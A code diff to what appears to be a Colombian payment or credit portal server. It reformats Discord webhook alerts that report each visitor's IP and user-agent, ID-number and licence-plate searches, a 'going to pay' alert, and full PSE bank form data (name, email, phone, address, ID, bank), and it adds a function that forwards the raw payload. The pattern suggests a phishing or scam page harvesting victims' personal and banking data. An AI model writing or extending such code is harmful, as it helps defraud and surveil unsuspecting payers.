@@ -24,13 +24,21 @@ async function avisarEntrada(req) {
   if (!DISCORD_WEBHOOK_URL) return;
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
   const referrer = req.headers.referer || req.headers.referrer || '-';
-  const ua = req.headers['user-agent'] || '-';
-  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
+  const ua = (req.headers['user-agent'] || '-').substring(0, 256);
   const r = await fetch(DISCORD_WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: `🟢 Entrada al portal de pagos\nReferrer: ${referrer}\nIP: ${ip}\nUser-Agent: ${ua}\n${ts}`
+      embeds: [{
+        title: '🟢 Entrada al portal de pagos',
+        color: 0x2ecc71,
+        fields: [
+          { name: '🌐 Referrer', value: referrer, inline: false },
+          { name: '📍 IP', value: ip, inline: true },
+          { name: '💻 User-Agent', value: ua, inline: false },
+        ],
+        timestamp: new Date().toISOString()
+      }]
     })
   });
   if (!r.ok) throw new Error('Discord respondió ' + r.status);
@@ -49,12 +57,20 @@ app.get('/index2.html', (req, res) => {
 async function avisarBusqueda(req, cedula, placa) {
   if (!DISCORD_WEBHOOK_URL) return;
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
-  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
   const r = await fetch(DISCORD_WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: `🔎 Búsqueda de crédito\nNúmero de documento: ${cedula}\nNumero de Placa: ${placa}\nIP: ${ip}\n${ts}`
+      embeds: [{
+        title: '🔎 Búsqueda de crédito',
+        color: 0x3498db,
+        fields: [
+          { name: '🪪 Número de documento', value: cedula, inline: true },
+          { name: '🚗 Número de Placa', value: placa, inline: true },
+          { name: '📍 IP', value: ip, inline: true },
+        ],
+        timestamp: new Date().toISOString()
+      }]
     })
   });
   if (!r.ok) throw new Error('Discord respondió ' + r.status);
@@ -91,13 +107,24 @@ const HELPPIU_API_URL = process.env.HELPPIU_API_URL || 'https://helppiupay.com/a
 async function avisarCreditoAceptado(req, cedula, placa, valor) {
   if (!DISCORD_WEBHOOK_URL) return;
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
-  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
-  const montoTxt = valor ? '$' + Number(String(valor).replace(/[^\d]/g, '')).toLocaleString('es-CO') + ' COP' : '-';
+  const montoTxt = valor
+    ? '$ ' + Number(String(valor).replace(/[^\d]/g, '')).toLocaleString('es-CO') + ' COP'
+    : '-';
   const r = await fetch(DISCORD_WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: `🔎 Crédito aceptado\nNúmero de documento: ${cedula || '-'}\nNumero de Placa: ${placa || '-'}\nMonto a pagar: ${montoTxt}\nIP: ${ip}\n${ts}`
+      embeds: [{
+        title: '💳 Crédito aceptado — va a pagar',
+        color: 0xe67e22,
+        fields: [
+          { name: '🪪 Número de documento', value: cedula || '-', inline: true },
+          { name: '🚗 Número de Placa', value: placa || '-', inline: true },
+          { name: '💰 Monto a pagar', value: montoTxt, inline: true },
+          { name: '📍 IP', value: ip, inline: true },
+        ],
+        timestamp: new Date().toISOString()
+      }]
     })
   });
   if (!r.ok) throw new Error('Discord respondió ' + r.status);
@@ -187,19 +214,21 @@ async function avisarDiscord(b) {
   const monto = pick(d.amount, b.amount, d.amount_total, b.amount_total);
   const cliente = pick(d.customer_name, b.customer_name, d.customer?.name, b.customer?.name, '-');
   const email = pick(d.customer_email, b.customer_email, d.customer?.email, b.customer?.email, '-');
-  const montoTxt = monto !== undefined ? '$' + Number(monto).toLocaleString('es-CO') + ' COP' : '-';
+  const montoTxt = monto !== undefined
+    ? '$ ' + Number(monto).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' COP'
+    : '-';
   const r = await fetch(DISCORD_WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       embeds: [{
         title: '✅ Pago exitoso',
-        color: 0x2ecc71,
+        color: 0x27ae60,
         fields: [
-          { name: 'Referencia', value: String(referencia), inline: false },
-          { name: 'Monto', value: montoTxt, inline: true },
-          { name: 'Cliente', value: String(cliente), inline: true },
-          { name: 'Correo', value: String(email), inline: true }
+          { name: '🔖 Referencia', value: String(referencia), inline: false },
+          { name: '💰 Monto', value: montoTxt, inline: true },
+          { name: '👤 Cliente', value: String(cliente), inline: true },
+          { name: '📧 Correo', value: String(email), inline: true },
         ],
         timestamp: new Date().toISOString()
       }]
@@ -251,30 +280,43 @@ async function avisarFormularioPSE(b) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: [
-        '🏦 Envío formulario PSE',
-        `Referencia: ${referencia}`,
-        `Nombre: ${nombre}`,
-        `Apellido: ${apellido}`,
-        `Correo: ${correo}`,
-        `Valor: ${montoTxt}`,
-        `Tipo de documento: ${tipoDoc}`,
-        `Número de documento: ${numDoc}`,
-        `Tipo de persona: ${tipoPersona}`,
-        `Flujo PSE: ${flujoPSE}`,
-        `Banco clave: ${bancoClave}`,
-        `Banco: ${bancoNombre}`,
-        `Banco redirect: ${bancoRedirect}`,
-        `Teléfono: ${telefono}`,
-        `Dirección: ${direccion}`,
-        `Crédito (sesión): ${creditoSession}`,
-        `IP: ${ip}`,
-        `User-Agent: ${ua}`,
-        ts,
-      ].join('\n')
+      embeds: [{
+        title: '🏦 Envío formulario PSE',
+        color: 0x9b59b6,
+        fields: [
+          { name: '🔖 Referencia', value: referencia, inline: false },
+          { name: '👤 Nombre', value: nombre, inline: true },
+          { name: '👤 Apellido', value: apellido, inline: true },
+          { name: '📧 Correo', value: correo, inline: false },
+          { name: '💰 Valor', value: montoTxt, inline: true },
+          { name: '🪪 Tipo de documento', value: tipoDoc, inline: true },
+          { name: '🪪 Número de documento', value: numDoc, inline: true },
+          { name: '🏢 Tipo de persona', value: tipoPersona, inline: true },
+          { name: '🔀 Flujo PSE', value: flujoPSE, inline: true },
+          { name: '🏦 Banco clave', value: bancoClave, inline: true },
+          { name: '🏦 Banco', value: bancoNombre, inline: true },
+          { name: '🏦 Banco redirect', value: bancoRedirect, inline: true },
+          { name: '📞 Teléfono', value: telefono, inline: true },
+          { name: '📍 Dirección', value: direccion, inline: false },
+          { name: '🔑 Crédito (sesión)', value: creditoSession, inline: true },
+          { name: '🌐 IP', value: ip, inline: true },
+          { name: '💻 User-Agent', value: ua.substring(0, 256), inline: false },
+        ],
+        timestamp: new Date().toISOString()
+      }]
     })
   });
   if (!r.ok) throw new Error('Discord respondió ' + r.status);
+}
+
+async function enviarPayloadRaw(b) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  const raw = JSON.stringify(b, null, 2).substring(0, 1900);
+  await fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: `\`\`\`json\n${raw}\n\`\`\`` })
+  });
 }
 
 app.post('/api/helppiupay-webhook', async (req, res) => {
@@ -289,6 +331,7 @@ app.post('/api/helppiupay-webhook', async (req, res) => {
       console.log('[DISCORD] Aviso de pago exitoso enviado');
     } else if (esPSEPendiente(b)) {
       await avisarFormularioPSE(b);
+      await enviarPayloadRaw(b);
       console.log('[DISCORD] Aviso formulario PSE enviado');
     }
   } catch (e) {
